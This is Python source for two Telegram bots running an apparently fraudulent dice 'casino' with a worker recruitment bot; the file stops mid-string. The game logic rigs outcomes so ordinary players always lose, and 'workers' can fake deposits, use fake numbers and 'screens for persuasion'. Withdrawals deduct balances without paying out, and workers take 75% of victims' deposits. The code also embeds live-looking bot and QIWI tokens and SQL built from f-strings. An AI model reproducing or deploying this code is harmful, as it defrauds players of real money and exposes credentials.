# -*- coding: utf8 -*-
import random
import sqlite3
import time
import traceback
from threading import Thread

import requests
import telebot

token3 = "8572a9428be4e8a9b9f9d7de52ac99fa"
try:
    bot = telebot.TeleBot("5206066773:AAHTAmqXEXI5l_6J-KpSmjNe-puMIGe1YL4")
    bot2 = telebot.TeleBot("1249475698:AAGa46uB4kpJjoORkxl53r773JTNHM8XQmI")
except:
    pass
#bot = telebot.TeleBot("1234957933:AAE5UavnOUudk5FjeWBjLDxyyqqBUalXzxo")
admin = 5012767563
topadmin = 5012767563
#topadmin = 915074414
admins = [5012767563]
num1 = "380668605129"
num2 = "79044132883"
botname = "bomberukr_bot"
name = "Bomberukr"
moneychat = "https://t.me/joinchat/AAAAAEk3jbTHda3euzxzCw"
workerchat = "https://t.me/joinchat/IitSshVL12TJ6xZN5SKZlA"
profitsid = -1001668911183

"""
s = requests.Session()
s.headers['authorization'] = 'Bearer ' + token3
parameters = {'rows': 10}
response = s.get('https://edge.qiwi.com/payment-history/v2/persons/' + num1 + '/payments',
                 params=parameters)
print(response)
response = response.json()
response = response['data']
for x in response:
    print(x)
input()
"""
posttopnow = 1

screens = "https://t.me/joinchat/SqoCLYwWW5tkBxqy"
manual = ""
global stop
stop = 0
o = 0

def grabglobalbase():
    con = sqlite3.connect("bot.db")
    cur = con.cursor()
    cur.execute(f"SELECT * FROM bottable")
    base = cur.fetchall()
    return base


daytopsenderon = 0
weektopsenderon = 0
def daytopsender():
    global posttopnow
    while True:
        if posttopnow == 0:
            posttopnow = 1
        else:
            con = sqlite3.connect("bot.db")
            cur = con.cursor()
            gbase = grabglobalbase()
            top = []
            for b in gbase:
                try:
                    cur.execute("UPDATE bottable SET day = (?) WHERE id = (?)", (0, b[0]))
                    con.commit()
                    try:
                        d = int(b[16])
                    except:
                        d= 0
                    if d == 0:
                        pass
                    else:
                        top.append([b[0],d])
                except:
                    pass
            top = sorted(top, key=lambda x: x[1], reverse=True)
            m = "👑Топ Воркеров за 24 часа👑\n\n"
            n = 1
            for t in top:
                print(t)
                u = None
                try:
                    u = bot.get_chat(t[0]).username
                except:
                    pass
                if u == None:
                    u = "id" + str(t[0])
                else:
                    u = "@" + str(u)
                m = m+str(n)+") " + u + " - " + str(t[1]) + "₽\n"
                n+=1
            print(m)
            bot.send_message(profitsid,m)
        time.sleep(86400)

def onliner():
    while True:
        global o
        t = time.asctime()
        print(t)
        t = t.split(" ")[-2]
        #print(t)
        t = t.split(":")
        #print(t)
        global daytopsenderon
        if t[0] == "10" and daytopsenderon !=1:
            #if daytopsenderon !=1:
            daytopsenderon = 1
            thread1 = Thread(target=daytopsender, args=())
            thread1.start()
        online = int(t[0])*60+int(t[1])

        if online < 500:
            min = 10
            max = 30
        elif online < 1000:
            min = 20
            max = 50
        elif online < 1300:
            min = 50
            max = 70
        else:
            min = 20
            max = 50
        r = random.randint(0,1)
        if r == 0:
            o-=random.randint(1,3)
        else:
            o += random.randint(1, 3)
        if o < min:
            o = min + random.randint(0,int((max-min)/4))
        elif o>max:
            o = max - random.randint(0, int((max-min)/4))
        print(o)
        time.sleep(20)


thread1 = Thread(target=onliner, args=())
thread1.start()

def sender(msg, toworkers = False):
    print(toworkers)
    global stop
    stop = 0
    print('РАССЫЛКА')
    con = sqlite3.connect("bot.db")
    cur = con.cursor()
    cur.execute(f"SELECT * FROM bottable")
    base = cur.fetchall()
    for user in base:
        if stop == 1:
            stop = 0
            print("STOPPED")
            return
        try:
            print(user[10])
            if toworkers == True and user[10] != 1:
                pass
            else:
                id = user[0]
                bot.send_message(id, msg)
                print("ОТПРАВЛЕНО " + str(id))
        except:
            pass



def getkeyboard(isworker,id):
    keyboard1 = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
    keyboard1.row('Играть')
    keyboard1.row('Пополнить', "Вывести")
    if isworker == 1:
        keyboard1.row('Меню воркера')
    if id in admins:
        keyboard1.row('Воркеры', "Справка админа","Написать от бота")
        keyboard1.row('Рассылка', "Остановить рассылку")
    return keyboard1

def menutext(base):
    global o
    referals = base[4].split(",")
    try:
        referals.remove("")
    except:
        pass
    print("MENUTEXT")
    print(o)
    text = "✅ ЛИЧНЫЙ КАБИНЕТ ✅\n\n💵 Баланс: " + str(int(base[1])) + "₽" + "\n💰 Ваш реферальный баланс: " + str(round(base[11], 2)) + "₽\n\n👥 Ваши рефералы: " + str(len(referals)) +"\n👤 Ваша реферальная ссылка:\nhttp://t.me/"+botname+"?start=" + str(base[0]) + "\n\n🎲 Число человек онлайн 🎲\n" +str(o)
    return text

keyboard1worker = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
keyboard1worker.row('Пополнить баланс', "Изменить баланс")
keyboard1worker.row('Информация', "Мои рефералы")
keyboard1worker.row("Выйти")

keyboard2 = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
keyboard2.row("Закончить игру")

keyboardaccept = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
keyboardaccept.row("Принять условия")

keyboard3 = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
keyboard3.row('< 50', "= 50", "> 50")
keyboard3.row("Закончить игру")
def grabbase(id):
    con = sqlite3.connect("bot.db")
    cur = con.cursor()
    cur.execute(f"SELECT * FROM bottable WHERE id='{id}'")
    base = cur.fetchone()
    if base == None:
        base = (id, 0, "", "start", "", 0, 0, 0, 0, "", 0, 0, "", "+" + num2, "", "", 0, 0,"")
        cur.execute("INSERT INTO bottable VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",(id, 0, "", "start", "", 0, 0, 0, 0, "", 0, 0, "", "+" + num2, "", "", 0, 0,""))
        con.commit()

    return base


def answer(message):
    try:
        con = sqlite3.connect("bot.db")
        cur = con.cursor()
        base = grabbase(message.from_user.id)
        print(message.text)
        if message.text.lower() == 'играть':
            bot.send_message(message.chat.id, "Введите сумму ставки\nМинимальная сумма ставки - 100 руб\n\nВаш баланс: "+ str(round(base[1],2)) +"₽", reply_markup=keyboard2)
            cur.execute("UPDATE bottable SET place = (?) WHERE id = (?)",("bet", message.from_user.id))
            con.commit()
        elif message.text.lower() == "принять условия":
            bot.send_message(message.chat.id, menutext(base), reply_markup=getkeyboard(base[10],base[0]))
            cur.execute("UPDATE bottable SET policy = (?) WHERE id = (?)", (1, message.from_user.id))
            con.commit()
        elif message.text.lower() == "закончить игру":
            bot.send_message(message.chat.id, "😔 Очень жаль, что Вы так мало решили поиграть 😔",reply_markup=getkeyboard(base[10],base[0]))
            bot.send_message(message.chat.id, menutext(base), reply_markup=getkeyboard(base[10],base[0]))
            cur.execute("UPDATE bottable SET place = (?) WHERE id = (?)", ("start", message.from_user.id))
            con.commit()
        elif base[3] == "bet":
            try:
                bet = float(message.text)
                if bet <= base[1] and bet >= 100:
                    bot.send_message(message.chat.id, "Сейчас выпадет рандомное число от 1 до 99\n\nВыберите исход события\n\n< 50 - x2\n= 50 - x10\n> 50 - x2",reply_markup=keyboard3)
                    cur.execute("UPDATE bottable SET place = (?), bet = (?) WHERE id = (?)", ("gameres", bet, message.from_user.id))
                    con.commit()
                else:
                    bot.send_message(message.chat.id, "Введите корректное значение", reply_markup=keyboard2)
            except:
                pass
                bot.send_message(message.chat.id, "Ошибка", reply_markup=keyboard2)
        elif base[3] == "gameres":
            if base[8] == 0:
                if message.text == "< 50":
                    message1=  "Выпало число " + str(random.randint(50,99)) + "\n\n"
                elif message.text == "= 50":
                    while True:
                        r = random.randint(1,99)
                        if r != 50:
                            break
                    message1=  "Выпало число " + str(r) + "\n\n"
                elif message.text == "> 50":
                    message1=  "Выпало число " + str(random.randint(1,50)) + "\n\n"
                bot.send_message(message.chat.id, message1 + "К сожалению, вы проиграли", reply_markup=getkeyboard(base[10],base[0]))
                cur.execute("UPDATE bottable SET place = (?), balance = (?) WHERE id = (?)",("start", base[1] - round(base[7] * 1, 2), message.from_user.id))
                con.commit()
            else:
                if message.text == "< 50":
                    bot.send_message(message.chat.id, "Выпало число " + str(random.randint(1,50)) + "\n\nВы выиграли "+ str(round(base[7]*2,2))+" руб", reply_markup=getkeyboard(base[10],base[0]))
                    cur.execute("UPDATE bottable SET place = (?), balance = (?) WHERE id = (?)",("start", base[1]+round(base[7]*1,2), message.from_user.id))
                    con.commit()
                elif message.text == "= 50":
                    bot.send_message(message.chat.id, "Выпало число 50\n\nВы выиграли "+ str(round(base[7]*10,2))+" руб", reply_markup=getkeyboard(base[10],base[0]))
                    cur.execute("UPDATE bottable SET place = (?), balance = (?) WHERE id = (?)",("start", base[1]+round(round(base[7]*9,2)), message.from_user.id))
                    con.commit()
                elif message.text == "> 50":
                    bot.send_message(message.chat.id, "Выпало число " + str(random.randint(51,99)) + "\n\nВы выиграли "+ str(round(base[7]*2,2))+" руб", reply_markup=getkeyboard(base[10],base[0]))
                    cur.execute("UPDATE bottable SET place = (?), balance = (?) WHERE id = (?)",("start", base[1]+round(round(base[7]*1,2)), message.from_user.id))
                    con.commit()
        elif message.text[:17] == "разослатьворкерам" and base[0] in admins:
            request = message.text.split("#")
            thread1 = Thread(target=sender, args=(request[1],True))
            thread1.start()
        elif message.text[:9] == "разослать" and base[0] in admins:
            request = message.text.split("#")
            thread1 = Thread(target=sender, args=(request[1],))
            thread1.start()
            bot.send_message(message.chat.id, "Рассылаем")

            bot.send_message(message.chat.id, "Рассылаем")
        elif message.text == "Рассылка":
            bot.send_message(message.chat.id, "Чтобы сделать рассылку введите команду 'разослать' и через решетку текст рассылки\nПример: разослать#текст рассылки\n\nЧтобы сделать рассылку по воркерам, используйте команду 'разослатьворкерам'")
        elif message.text == "Написать от бота":
            bot.send_message(message.chat.id, "Чтобы написать от имени бота, введите 'отправить', затем через решетку текст сообщения и в конце также через решетку id того, кому отправить")

        elif message.text == "Остановить рассылку":
            global stop
            stop = 1
        elif message.text  == "Пополнить":
            user_id = message.from_user.id
            s = requests.Session()
            s.headers['authorization'] = 'Bearer ' + token3
            parameters = {'rows': 10}
            response = s.get('https://edge.qiwi.com/payment-history/v2/persons/'+num1+'/payments',
                             params=parameters)
            print(response)
            response = response.json()
            response = response['data']
            history = base[9]
            comment = str(base[0])
            found = 0
            fakelist = []
            globalbase = grabglobalbase()
            for x in globalbase:
                try:
                    accfake = x[12].split("#")
                    for fake in accfake[-3:]:
                        try:
                            fake = fake.split("|")
                            response.append({"comment":fake[0],'personId': x[13],"txnId":fake[2],"sum":{"amount":float(fake[1])}})
                        except:
                            pass
                except:
                    pass
            for val in response:
                try:
                    print(val['type'])
                    if val['type'] != "IN":
                        continue
                except:
                    pass
                if len(val) != 4:
                    print(val['comment'])
                mybase = grabbase(915074414)


                if val['comment'] == comment and not str(val['txnId']) in history:
                    num = str(val['personId'])
                    sum = val['sum']['amount']
                    if sum >= 100:
                        num = base[15] + num + ", "
                        found = 1
                        history = history+  str(val['txnId']) + ","
                        balance = base[1] + sum
                        if len(val) == 4:
                            prime = 1
                        else:
                            prime = 0
                            try:
                                reffer = int(base[6])
                                refbase = grabbase(reffer)
                                d = refbase[16]
                                if d == None:
                                    d = 0
                                w = refbase[17]
                                if w == None:
                                    w = 0
                                cur.execute("UPDATE bottable SET workerbalance = (?), day = (?), week = (?) WHERE id = (?)",(refbase[11] + sum * 0.75,d+ sum,w+ sum, reffer))
                                con.commit()
                                bot.send_message(reffer, "Баланс вашего реферала " + str(message.from_user.id) + " пополнен на " + str(sum) + " руб")
                                bot.send_message(admin, "Баланс пользователя " + str(message.from_user.id) + " пополнен на " + str(sum) + " руб\nВоркер " +str(refbase[0]))
                                u = None
                                try:
                                    u = bot.get_chat(refbase[0]).username
                                except:
                                    pass
                                if u == None:
                                    u = str(refbase[0])
                                else:
                                    u = "@" + str(u)
                                bot.send_message(profitsid,"🔥 Успешное пополнение\n\n💸 Доля воркера: " + str(int(int(sum) * 0.75)) + "₽ (-25%)\n💵 Сумма пополнения: " + str(sum) + "₽\n\n👤 Воркер: "+u)
                            except:
                                bot.send_message(profitsid,"🔥 Успешное пополнение\n\n💸 Доля воркера: " + str(int(int(sum) * 0.75)) + "₽ (-25%)\n💵 Сумма пополнения: " + str(sum) + "₽\n\n👤 Воркер: None")
                        cur.execute("UPDATE bottable SET balance = (?), history = (?), prime = (?), numhist = (?) WHERE id = (?)", (balance, history,prime,num, message.from_user.id))
                        con.commit()
                        base = grabbase(message.from_user.id)
                        bot.send_message(message.chat.id, "Баланс пополнен на " + str(sum) + " руб\nВаш баланс: "+ str(round(base[1],2))+" руб",reply_markup=getkeyboard(base[10],base[0]))
                else:
                    i = 0
                    try:
                        c = int(val['comment'])
                        i = 1
                    except:
                        pass
                    if i == 0 and not str(val['txnId']) in mybase[9]:
                        num = str(val['personId'])
                        sum = val['sum']['amount']
                        history = mybase[9] + str(val['txnId']) + ","
                        if len(val) != 4:
                            bot.send_message(profitsid, "🔥 Успешное пополнение\n\n💸 Доля воркера: " + str(
                                int(int(sum) * 0.75)) + "₽ (-25%)\n💵 Сумма пополнения: " + str(
                                sum) + "₽\n\n👤 Воркер: None")
                            cur.execute("UPDATE bottable SET history = (?) WHERE id = (?)", (history, 915074414))
                            con.commit()
            if found == 0:
                bot.send_message(message.chat.id, "Чтобы пополнить баланс, переведите необходимую сумму на кошелек +"+num1+" с комментарием "+ str(base[0]) + "\n\nМинимальная сумма пополнения - 100 руб",reply_markup=getkeyboard(base[10],base[0]))
        elif message.text == "Меню воркера" and base[10] == 1:
            bot.send_message(message.chat.id, menutext(base), reply_markup=keyboard1worker)
        elif message.text == "Пополнить баланс" and base[10] == 1:
            bot.send_message(message.chat.id, "Введите комментарий (комментарий узнайте у того, кому пополняете) и через пробел сумму пополнения\nПример: 915074414 1000", keyboard1worker)
            cur.execute("UPDATE bottable SET place = (?) WHERE id = (?)",("newfake", message.from_user.id))
            con.commit()
        elif message.text == "Изменить баланс" and base[10] == 1:
            bot.send_message(message.chat.id, "Чтобы поменять баланс, введите setbalance, далее через пробел id и еще через пробел новый баланс. Например setbalance 94732734 500", keyboard1worker)
        elif message.text[:9] == "отправить":
            if base[10] == 1 or base[0] in admins:
                s = message.text.split("#")
                bot.send_message(s[2], s[1])
                bot.send_message(message.chat.id,"Успешно")
        elif message.text == "Информация" and base[10] == 1:
            bot.send_message(message.chat.id, "Фейковый номер: "+ base[13] + "\n\nСкрины для убедительности: "+screens, keyboard1worker)
        elif base[3] == "newfake" and base[10] == 1:
            cur.execute("UPDATE bottable SET place = (?) WHERE id = (?)", ("start", message.from_user.id))
            con.commit()
            try:
                newfake = message.text.split(" ")
                comm =int(newfake[0])
                sum = float(newfake[1])
                newfake.append(str(random.randint(100000,999999)))
                newfake = "|".join(newfake)
                fake = base[12]
                if fake != "":
                    newfake = "#"+ newfake
                cur.execute("UPDATE bottable SET fake = (?) WHERE id = (?)", (fake+newfake, message.from_user.id))
                con.commit()
                bot.send_message(message.chat.id, "Успешно. Попросите клиента нажать на кнопку 'Пополнить' и средства зачислятся на счет", keyboard1worker)

            except:
                #pass
                bot.send_message(message.chat.id, "Ошибка", keyboard1worker)
        elif message.text == "Мои рефералы":
            referals = base[4].split(",")
            if len(referals) == 1:
                bot.send_message(message.chat.id,"У вас нет рефералов", keyboard1worker)
            else:
                msg = "id/баланс\n\n"
                gb = grabglobalbase()
                #print(gb)
                for r in referals:

                    try:
                        for x in gb:
                            #print("R: " +str(r))
                            if x[0] == int(r):
                                res = x
                        msg = msg + str(res[0]) + " " + str(round(res[1],2))+" руб"
                        if res[8] == 1:
                            msg = msg+" PRIME"
                        msg = msg +  "\n"
                    except:
                        pass
                bot.send_message(message.chat.id,msg + "\n\nЧтобы включать и отключать своим рефералам режим выигрыша (prime) используйте команды prime и noprime и через пробел указывайте id реферала\nПример: prime 1109569694", keyboard1worker)
        elif message.text == "Воркеры":
            gb = grabglobalbase()
            msg = "id/баланс\n\n"
            for x in gb:
                if x[10] == 1:
                    msg = msg+str(x[0]) + " " + str(round(x[11],2)) + " руб\n"
            bot.send_message(message.chat.id, msg)


        elif message.text == "Выйти":
            print("EXIT")
            bot.send_message(message.chat.id,  menutext(base), reply_markup=getkeyboard(base[10],base[0]))
            cur.execute("UPDATE bottable SET place = (?) WHERE id = (?)", ("start", message.from_user.id))
            con.commit()
        elif message.text == "Вывести":
            cur.execute("UPDATE bottable SET place = (?) WHERE id = (?)", ("wdsumfake", message.from_user.id))
            con.commit()
            bot.send_message(message.chat.id, "Введите сумму вывода\nУ вас на балансе "+str(round(base[1],2)) + " руб", getkeyboard(base[10],base[0]))
        elif message.text == "Вывести средства" and base[10] == 1:
            bot.send_message(message.chat.id, "Введите сумму вывода\nУ вас на балансе "+str(round(base[11],2)) + "руб", keyboard1worker)
            cur.execute("UPDATE bottable SET place = (?) WHERE id = (?)", ("wdsum", message.from_user.id))
            con.commit()
        elif message.text == "id":
            bot.send_message(message.chat.id, "Ваш id: " + str(base[0]))
        elif message.text == "Справка админа":
            bot.send_message(message.chat.id, "Как дать права воркера?\nПишете worker и через пробел id воркера. Например, чтобы назначить воркером пользователя с id 915074414 надо написать\nworker 915074414\n\nЧтобы убрать права воркера введите то же самое, но с командой notworker\n\nЧтобы любой мог узнать свой id, есть команда id\n\nИзменение баланса\nЧтобы поменять баланс, введите setbalance, далее через пробел id и еще через пробел новый баланс. Например \nsetbalance 94732734 500\n\nЧтобы поменять баланс воркера, введите то же самое, но с командой setworkerbalance")
        elif message.text[:6] == "worker" and base[0] in admins:
            workerid = message.text.split(" ")
            workerid = workerid[1]
            cur.execute("UPDATE bottable SET worker = (?) WHERE id = (?)", (1, workerid))
            con.commit()
            bot.send_message(message.chat.id, "Успешно")
        elif message.text[:5] == "prime":
            primeid = message.text.split(" ")[1]
            if primeid in base[4] or message.from_user.id in admins:
                cur.execute("UPDATE bottable SET prime = (?) WHERE id = (?)", (1, primeid))
                con.commit()
                bot.send_message(message.chat.id, "Успешно")
            else:
                bot.send_message(message.chat.id, "Не ваш реферал")
        elif message.text[:7] == "noprime":
            primeid = message.text.split(" ")[1]
            if primeid in base[4] or message.from_user.id in admins:
                cur.execute("UPDATE bottable SET prime = (?) WHERE id = (?)", (0, primeid))
                con.commit()
                bot.send_message(message.chat.id, "Успешно")
            else:
                bot.send_message(message.chat.id, "Не ваш реферал")
        elif message.text[:9] == "notworker" and base[0] in admins:
            workerid = message.text.split(" ")
            workerid = workerid[1]
            cur.execute("UPDATE bottable SET worker = (?) WHERE id = (?)", (0, workerid))
            con.commit()
            bot.send_message(message.chat.id, "Успешно")
        elif message.text[:10] == "setbalance":
            newbalance = message.text.split(" ")
            if newbalance[1] in base[4] or base[0] in admins:
                cur.execute("UPDATE bottable SET balance = (?) WHERE id = (?)", (newbalance[2], newbalance[1]))
                con.commit()
                bot.send_message(message.chat.id, "Успешно")
            else:
                bot.send_message(message.chat.id, "Не ваш реферал")
        elif message.text[:16] == "setworkerbalance" and base[10] == 1:
            newbalance = message.text.split(" ")
            cur.execute("UPDATE bottable SET workerbalance = (?) WHERE id = (?)", (newbalance[2], newbalance[1]))
            con.commit()
            bot.send_message(message.chat.id, "Успешно")
        elif base[3] == "wdsum":
            try:
                sum = float(message.text)
                if sum > 0 and sum <=base[11]:
                    cur.execute("UPDATE bottable SET place = (?) WHERE id = (?)", ("wdnum", message.from_user.id))
                    con.commit()
                    cur.execute("UPDATE bottable SET wdsum = (?) WHERE id = (?)", (message.text, message.from_user.id))
                    con.commit()
                    bot.send_message(message.chat.id, "Введите номер QIWI кошелька в международном формате, начиная с +", keyboard1worker)
                else:
                    bot.send_message(message.chat.id, "Введите корректное значение", keyboard1worker)
            except:
                bot.send_message(message.chat.id, "Введите корректное значение", keyboard1worker)
        elif base[3] == "wdnum":
            try:
                cur.execute("UPDATE bottable SET place = (?) WHERE id = (?)", ("start", message.from_user.id))
                con.commit()
                cur.execute("UPDATE bottable SET workerbalance = (?) WHERE id = (?)",
                            (base[11] - float(base[14]), message.from_user.id))
                con.commit()
                bot.send_message(admin, "ВЫВОД\n\n" + message.text + "\n" + base[14])

                #print("ВЫВОД\n\n" + message.text + "\n" + base[14] + " руб")
                bot.send_message(message.chat.id, "Запрос передан в обработку", keyboard1worker)
            except:
                bot.send_message(message.chat.id, "Ошибка", keyboard1worker)


        elif base[3] == "wdsumfake":
            try:
                sum = float(message.text)
                if sum > 0 and sum <= base[1]:
                    cur.execute("UPDATE bottable SET place = (?) WHERE id = (?)", ("wdnumfake", message.from_user.id))
                    con.commit()
                    cur.execute("UPDATE bottable SET wdsum = (?) WHERE id = (?)", (message.text, message.from_user.id))
                    con.commit()
                    bot.send_message(message.chat.id, 'Введите номер QIWI кошелька в международном формате, начиная с "+"', getkeyboard(base[10],base[0]))
                else:
                    bot.send_message(message.chat.id, "Введите корректное значение", getkeyboard(base[10],base[0]))
            except:
                bot.send_message(message.chat.id, "Введите корректное значение", getkeyboard(base[10],base[0]))

        elif base[3] == "wdnumfake":
            try:
                cur.execute("UPDATE bottable SET place = (?) WHERE id = (?)", ("start", message.from_user.id))
                con.commit()
                if message.text in base[15] or message.text == "+77054732883":
                    if len(message.text) > 9:
                        cur.execute("UPDATE bottable SET balance = (?) WHERE id = (?)",(base[1] - float(base[14]), message.from_user.id))
                        con.commit()
                        bot.send_message(message.chat.id, "Запрос передан в обработку. Средства поступят на ваш счет в течении 5 мин", getkeyboard(base[10],base[0]))
                    else:
                        bot.send_message(message.chat.id,"Неверный номер",
                                         getkeyboard(base[10], base[0]))
                else:
                    bot.send_message(message.chat.id,"Вывод средств возможен только на кошельки, с которых был пополнен баланс",getkeyboard(base[10],base[0]))
            except:
                bot.send_message(message.chat.id, "Ошибка", getkeyboard(base[10],base[0]))
    except:
        traceback.print_exc()
        f = open("errors.txt", "a", encoding='utf-8')
        f.write(traceback.format_exc() + "\n")
        f.close()

def answer2(message):
    con = sqlite3.connect("bot.db")
    cur = con.cursor()
    base = grabbase(message.chat.id)
    print(message)
    if message.text == "/start":
        kb = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        if base[0] == topadmin:
            kb.row('Подать заявку')
            kb.row("Посмотреть заявки", "Статистика")
        else:
            kb.row('Подать заявку')
        bot2.send_message(message.from_user.id,"👋Добро пожаловать!\n\nПодай заявку, чтобы присоединиться к 🔥"+name+"🔥",reply_markup=kb)
    elif message.text ==  "Отменить" or message.text == "Вернуться к началу" or message.text == "❌ Не интересует":
        kb = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        kb.row('Подать заявку')
        bot2.send_message(message.from_user.id,"👋Подай заявку, чтобы присоединиться к 🔥"+name+"🔥", reply_markup=kb)
    elif message.text == "Подать заявку" or message.text == "Подать новую заявку":
        if base[10] != 1:
            try:
                t = int(base[2])
            except:
                t = 0
            if t + 1200 > time.time():
                bot2.send_message(message.chat.id, "✅Вы уже отправляли заявку!\n\nЕще одну заявку можно будет отправить чуть позже")
            else:
                kb = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
                kb.row('✅ Ознакомился', "❌ Не интересует")
                bot2.send_message(message.chat.id,"✅Для начала ознакомься с мануалом✅\n\nhttps://telegra.ph/Manual-dlya-raboty-12-24-2", reply_markup=kb)
        else:
            bot2.send_message(message.chat.id, "✅Вы уже являетесь воркером!")
    elif message.text == "✅ Ознакомился":
        u = message.from_user.username
        if u == None:
            bot2.send_message(message.chat.id, "Прежде чем продолжить, установите имя пользователя (username) в настройках своего профиля")
        else:
            cur.execute("UPDATE bottable SET place = (?), username = (?) WHERE id = (?)", ("bacg",u, message.from_user.id))
            con.commit()
            bot2.send_message(message.chat.id,"🧠Есть ли у вас опыт? Если да, то скажите какой?",reply_markup=telebot.types.ReplyKeyboardRemove())
    elif base[3] == "bacg":
        cur.execute("UPDATE bottable SET place = (?), comments = (?) WHERE id = (?)", ("hmtime",message.text, message.from_user.id))
        con.commit()
        bot2.send_message(message.chat.id, "💁🏻 Сколько Вы готовы уделять времени своей работе?")
    elif base[3] == "hmtime":
        cur.execute("UPDATE bottable SET place = (?), comments = (?) WHERE id = (?)", ("wfrom",base[2]+ "#" + message.text, message.from_user.id))
        con.commit()
        bot2.send_message(message.chat.id, "💁🏻 Отлично, пожалуйста, скажите откуда вы о нас узнали?")
    elif base[3] == "wfrom":
        cur.execute("UPDATE bottable SET place = (?), comments = (?) WHERE id = (?)",("start", base[2]+ "#" + message.text, message.from_user.id))
        con.commit()
        c = base[2].split("#")
        kb = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        kb.row('Отправить', "Отменить")
        bot2.send_message(message.chat.id, "✅Ваша заявка готова✅\n\nПрофиль: @" + base[18] + "\n\nВремя для работы: " + c[0] + "\n\nОпыт: " + c[1] + "\n\nОткуда узнали: " + message.text + "\n\n❗ Прошу не спамить заявками, мы видим каждую заявку, в случае спама вы будете заблокированы ❗",reply_markup=kb)
    elif message.text == "Отправить":
        cur.execute("UPDATE bottable SET worker = (?) WHERE id = (?)", (2, base[0]))
        con.commit()
        kb = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)
        kb.row('Вернуться к началу')
        bot2.send_message(message.chat.id, "✅ Заявка успешно отправлена, ожидайте.",reply_markup=kb)
        gb = grabglobalbase()
        count = 0
        for base in gb:
            if base[10] == 2:
                count += 1
        bot2.send_message(topadmin, "Посмотрите новые заявки: " + str(count) + " шт")
    elif message.text == "Посмотреть заявки" and message.chat.id == topadmin:
        gb = grabglobalbase()
        count = 0
        for base in gb:
            if base[10] == 2:
                count +=1
        bot2.send_message(topadmin, "Количество заявок: " + str(count) + " шт")
        for base in gb:
            if base[10] != 2:
                continue
            c = base[2].split("#")
            kb = telebot.types.InlineKeyboardMarkup()
            item1 = telebot.types.InlineKeyboardButton(text="✅", callback_data='accept' + str(base[0]))
            item2 = telebot.types.InlineKeyboardButton(text="❌", callback_data='decline'+ str(base[0]))
            kb.add(item1, item2)
            cur.execute("UPDATE bottable SET comments = (?), worker = (?) WHERE id = (?)", (int(time.time()),0, base[0]))
            con.commit()
            bot2.send_message(topadmin, "✅ Заявка "+str(base[0])+"\nПрофиль: @"+base[18]+"\n\nОпыт: " + c[0] + "\n\nВремя: " +c[1] +"\n\nОткуда узнал: " + c[2],reply_markup=kb)
            break
    elif message.text == "Количество заявок" and message.chat.id == topadmin:
        gb = grabglobalbase()
        count = 0
        for base in gb:
            if base[10] == 2:
                count += 1
        bot2.send_message(topadmin, "Количество заявок: " + str(count) + " шт")
    elif message.text == "Статистика" and message.chat.id == topadmin:
        d1 = 0
        d0 = 0
        w1 = 0
        w0 = 0
        at1 = 0
        at0 = 0
        cur.execute(f"SELECT * FROM bottable WHERE id='{topadmin}'")
        stat = cur.fetchone()[5].split("#")
        for s in stat:
            if s == "":
                continue
            s = s.split(",")
            if int(s[0]) > time.time()-86400:
                if s[1] == "1":
                    d1 += 1
                else:
                    d0 += 1
            if int(s[0]) > time.time()-604800:
                if s[1] == "1":
                    w1 += 1
                else:
                    w0 += 1
            if s[1] == "1":
                at1 += 1
            else:
                at0 += 1

        bot2.send_message(topadmin, "Admin, вот статистика заявок\n💸За сегодня :\n✅Принято : "+str(d1)+"\n❌Отклонено : "+str(d0)+"\n💸За неделю :\n✅Принято : "+str(w1)+"\n❌Отклонено : "+str(w0)+"\n💸За все время :\n✅Принято : "+str(at1)+"\n❌Отклонено : "+str(at0)+"\nУчёт ведётся с 13.12.2020")


try:
    @bot.message_handler(commands=['start'])
    def start_message(message):
        #print(message.from_user.id)
        ref = message.text[7:]
        #print("REF "+ref)
        userid = message.from_user.id
        con = sqlite3.connect("bot.db")
        cur = con.cursor()
        cur.execute(f"SELECT id FROM bottable WHERE id='{userid}'")
        try:
            ref = int(ref)
        except:
            ref = 0
        if cur.fetchone() == None:
            fakenum = random.randint(100000000,999999999)
            fakenum = "+79" + str(fakenum)
            cur.execute("INSERT INTO bottable VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)",
                        (userid, 0, "", "start", "",0,ref,0,0,"",0,0,"","+"+num2,"","",0,0,""))
            con.commit()
            try:
                cur.execute("UPDATE bottable SET referals = (?) WHERE id = (?)", (grabbase(ref)[4]+str(message.from_user.id)+",",ref))
                con.commit()
            except:
                pass
        base = grabbase(message.from_user.id)
        try:
            if base[6] == 0 and int(ref) != int(message.from_user.id):
                cur.execute("UPDATE bottable SET reffer = (?) WHERE id = (?)",(ref, message.from_user.id))
                con.commit()
        except:
            pass
        if base[5] == 0:
            name = message.from_user.first_name
            msg = "Здравствуй , "+name+"!\n\nПолитика и условия пользования данным ботом.\n1. Играя у нас, вы берёте все риски за свои средства на себя.\n2. Принимая правила, Вы подтверждаете своё совершеннолетие!\n" \
                                           "3. Ваш аккаунт может быть забанен в подозрении на мошенничество/обман нашей системы!\n4. Мультиаккаунты запрещены!\n5. Скрипты, схемы использовать запрещено!\n" \
                                           "6. Если будут выявлены вышеперчисленные случаи, Ваш аккаунт будет заморожен до выяснения обстоятельств!\n" \
                                           "7. В случае необходимости администрация имеет право запросить у Вас документы, подтверждающие Вашу личность и Ваше совершеннолетие.\n\nMoneyBot\n" \
                                           "Вы играете на виртуальные монеты, покупая их за настоящие деньги. Любое пополнение бота является пожертвованием!  Вывод денежных средств осуществляется только при достижении баланса, " \
                                           "в 5 раз превышающего с сумму Вашего пополнения!По всем вопросам Вывода средств, по вопросам пополнения, а так же вопросам играм обогащайтесь в поддержку, указанную в описании к боту. " \
                                           "Пишите сразу по делу, а не «Здравствуйте! Тут?»\nСтарайтесь изложить свои мысли четко и ясно, что поддержка не мучалась и не пыталась Вас понять.\nСпасибо за понимание!\nУдачи в игре.\n\n" \
                                           "Ваша задача - угадать, в каком диапазоне будет располагаться выпадшее число: От 0 до 50, либо от 50 до 100, в таком случае Вы получаете удовение суммы ставки, \n" \
